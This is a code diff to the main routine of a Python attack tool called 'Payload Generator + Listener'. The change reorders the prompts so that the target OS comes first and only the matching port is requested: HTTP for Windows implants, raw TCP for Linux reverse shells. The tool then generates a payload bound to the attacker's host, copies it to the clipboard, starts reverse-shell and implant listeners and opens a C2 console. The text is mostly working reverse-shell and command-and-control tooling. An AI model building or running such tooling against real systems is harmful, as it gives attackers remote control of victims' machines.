@@ -508,29 +508,33 @@ def main():
 
     print("=== Payload Generator + Listener ===\n")
 
+    # choose OS first
+    os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
+
     # get LHOST
     lhost = ask_ip("Enter LHOST (IPv4) to bind listeners and inject into payload: ")
 
-    # choose HTTP and TCP ports (must be different)
-    while True:
-        http_port = ask_port("Enter HTTP listener port (1-65535): ")
-        if not can_bind(lhost, http_port):
-            print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
-            continue
-        break
+    http_port = None
+    tcp_port = None
 
-    while True:
-        tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
-        if tcp_port == http_port:
-            print("[!] TCP port must be different from HTTP port.")
-            continue
-        if not can_bind(lhost, tcp_port):
-            print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
-            continue
-        break
+    if os_choice == "Windows":
+        # Ask only for HTTP port for Windows payloads
+        while True:
+            http_port = ask_port("Enter HTTP listener port (1-65535): ")
+            if not can_bind(lhost, http_port):
+                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
+                continue
+            break
+    else:
+        # Ask only for TCP port for Linux payloads
+        while True:
+            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
+            if not can_bind(lhost, tcp_port):
+                print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
+                continue
+            break
 
     # load payload module (linux/windows) and list keys
-    os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
     module = load_payload_module(os_choice)
     keys = list(module.payloads.keys())
     print("\nAvailable payloads:")
@@ -539,8 +543,9 @@ def main():
 
     payload_key = ask_choice("Select payload (type exact key): ", keys)
 
-    # generate payload (using tcp_port for reverse-socket payloads)
-    payload_text = generate_payload_text(module, payload_key, lhost, tcp_port)
+    # generate payload using the relevant port for the selected OS
+    selected_port = tcp_port if os_choice == "Linux" else http_port
+    payload_text = generate_payload_text(module, payload_key, lhost, selected_port)
 
     # display and copy
     print("\n[+] Generated payload (copied to clipboard):\n")
@@ -556,13 +561,22 @@ def main():
     HTTP_PORT = http_port
     RAW_TCP_PORT = tcp_port
 
-    # start listeners
+    # start only the relevant listeners
     try:
-        threading.Thread(target=run_http_server, daemon=True).start()
-        threading.Thread(target=monitor_http_implants, daemon=True).start()
-        threading.Thread(target=run_raw_tcp_server, daemon=True).start()
+        if HTTP_PORT:
+            threading.Thread(target=run_http_server, daemon=True).start()
+            threading.Thread(target=monitor_http_implants, daemon=True).start()
+        if RAW_TCP_PORT:
+            threading.Thread(target=run_raw_tcp_server, daemon=True).start()
         time.sleep(0.5)
-        print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
+        if HTTP_PORT and RAW_TCP_PORT:
+            print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
+        elif HTTP_PORT:
+            print(f"\n[*] Listener started on {HOST} (HTTP: {HTTP_PORT}).")
+        elif RAW_TCP_PORT:
+            print(f"\n[*] Listener started on {HOST} (TCP: {RAW_TCP_PORT}).")
+        else:
+            print("[!] No listeners started.")
         # Enter C2 console (blocking)
         c2_console()
     except Exception as e:
